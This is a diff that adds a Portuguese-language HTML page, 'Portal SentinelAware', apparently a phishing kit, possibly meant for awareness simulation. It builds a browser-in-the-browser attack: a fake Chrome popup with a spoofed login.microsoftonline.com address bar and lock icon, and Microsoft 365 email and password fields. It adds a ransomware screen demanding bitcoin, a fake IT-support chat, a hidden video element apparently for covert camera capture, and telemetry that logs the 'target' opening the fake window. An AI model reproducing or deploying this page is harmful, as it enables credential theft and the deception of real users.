@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Segurança Corporativa</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f4f4f4; display: flex; flex-direction: column; align-items: center; height: 100vh; }
+        
+        /* Landing Page Estilizada */
+        .navbar { width: 100%; background: #0078d4; color: white; padding: 15px 50px; box-sizing: border-box; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .hero { margin-top: 80px; text-align: center; max-width: 800px; }
+        .hero h1 { color: #333; font-size: 3rem; margin-bottom: 20px; }
+        .hero p { color: #666; font-size: 1.2rem; line-height: 1.6; margin-bottom: 40px; }
+        .btn-main { background: #0078d4; color: white; padding: 15px 40px; border-radius: 5px; text-decoration: none; font-weight: bold; font-size: 1.1rem; transition: 0.3s; cursor: pointer; border: none; }
+        .btn-main:hover { background: #005a9e; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,120,212,0.3); }
+
+        /* MOLDURA BITB (WINDOWS CHROME) */
+        #bitb-window {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 600px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 20px 70px rgba(0,0,0,0.5);
+            z-index: 100000;
+            flex-direction: column;
+            overflow: hidden;
+            border: 1px solid #ccc;
+            animation: openWindow 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes openWindow {
+            from { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
+            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+
+        /* Barra de Título (Fake Chrome) */
+        .window-title-bar {
+            background: #f1f3f4;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            border-bottom: 1px solid #ddd;
+            user-select: none;
+        }
+        .window-controls { display: flex; gap: 15px; margin-left: auto; }
+        .window-controls span { font-family: cursive; color: #5f6368; cursor: pointer; }
+
+        /* Barra de Endereços (Fake URL) */
+        .window-address-bar {
+            background: #fff;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        .address-box {
+            background: #f1f3f4;
+            flex: 1;
+            height: 30px;
+            border-radius: 20px;
+            margin: 0 10px;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            font-size: 13px;
+            color: #3c4043;
+        }
+        .lock-icon { width: 12px; margin-right: 8px; }
+        .domain-green { color: #1e8e3e; font-weight: 500; }
+
+        /* Conteúdo do Iframe Falso */
+        .window-content { flex: 1; position: relative; }
+        #fake-iframe { width: 100%; height: 100%; border: none; }
+
+        /* Camada de Bloqueio */
+        #bitb-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 99999; backdrop-filter: blur(2px); }
+
+        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:999999; text-align:center; padding-top:100px; font-family:monospace; }
+        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; display: none; z-index: 1000; border: 1px solid #eee; text-align: left; }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div style="font-weight:bold; font-size:1.2rem;">Portal SentinelAware</div>
+        <div>Suporte: 0800 555 1234</div>
+    </div>
+
+    <div class="hero">
+        <h1>Validação de Identidade Requerida</h1>
+        <p>Detectamos uma tentativa de acesso incomum à sua conta. Para garantir a segurança dos dados corporativos, por favor realize a autenticação multifator para continuar navegando.</p>
+        <button class="btn-main" onclick="openBitB()">Entrar com Microsoft 365</button>
+    </div>
+
+    <!-- Estrutura BitB -->
+    <div id="bitb-overlay" onclick="closeBitB()"></div>
+    <div id="bitb-window">
+        <div class="window-title-bar">
+            <img src="https://www.google.com/s2/favicons?domain=microsoft.com" style="width:16px; margin-right:10px;">
+            <span style="font-size:12px; color:#5f6368;">Entrar na sua conta Microsoft</span>
+            <div class="window-controls">
+                <span>—</span> <span>▢</span> <span onclick="closeBitB()" style="font-weight:bold;">✕</span>
+            </div>
+        </div>
+        <div class="window-address-bar">
+            <div style="display:flex; gap:10px; color:#5f6368;"><span>←</span> <span>→</span> <span>↻</span></div>
+            <div class="address-box">
+                <svg class="lock-icon" viewBox="0 0 24 24"><path fill="#1e8e3e" d="M18,8H17V6A5,5 0 0,0 12,1A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M12,17A2,2 0 1,1 14,15A2,2 0 0,1 12,17M9,8V6A3,3 0 0,1 12,3A3,3 0 0,1 15,6V8H9Z"/></svg>
+                <span>https://</span><span class="domain-green">login.microsoftonline.com</span><span>/common/oauth2/v2.0/authorize</span>
+            </div>
+        </div>
+        <div class="window-content">
+            <!-- Conteúdo Real do Phishing dentro da Janela Fake -->
+            <div id="bitb-login-content" style="padding:40px; text-align:center;">
+                <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d96235806e0c0d62cc2be446176.svg" style="width:110px; margin-bottom:20px;">
+                <h2 style="font-size:24px; margin-bottom:15px; text-align:left; font-weight:600; color:#1b1b1b;">Entrar</h2>
+                <input type="email" id="u" style="width:100%; border:none; border-bottom:1px solid #666; padding:10px 0; font-size:16px; margin-bottom:20px; outline:none;" placeholder="E-mail ou Usuário">
+                <input type="password" id="p" style="width:100%; border:none; border-bottom:1px solid #666; padding:10px 0; font-size:16px; margin-bottom:20px; outline:none; display:none;" placeholder="Senha">
+                <div style="text-align:left; font-size:13px; color:#0067b8; margin-bottom:30px; cursor:pointer;">Não consegue acessar sua conta?</div>
+                <button id="btn" onclick="handleAuth()" style="background:#0067b8; color:white; border:none; padding:10px 35px; cursor:pointer; float:right; font-weight:600; border-radius:2px;">Próximo</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ransomware -->
+    <div id="ransom-overlay">
+        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
+        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
+        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+    </div>
+
+    <!-- Chat -->
+    <div id="chat-widget">
+        <div style="background:#0067b8; color:white; padding:15px; font-weight:bold;">Suporte TI Corporativo</div>
+        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
+        <div style="display:flex; padding:10px; border-top:1px solid #eee;">
+            <input type="text" id="chat-in" placeholder="Responder..." style="flex:1; border:none; outline:none;">
+            <button onclick="sendChat()" style="background:none; border:none; color:#0067b8; font-weight:bold; cursor:pointer;">↑</button>
+        </div>
+    </div>
+
+    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script src="/sentinel.js?v=7"></script>
+    <script>
+        function openBitB() {
+            document.getElementById('bitb-overlay').style.display = 'block';
+            document.getElementById('bitb-window').style.display = 'flex';
+            sendTelemetry('perf', { logId: window.logId, text: '[BITB]: Janela falsa aberta pelo alvo.' });
+        }
+        function closeBitB() {
+            document.getElementById('bitb-overlay').style.display = 'none';
+            document.getElementById('bitb-window').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
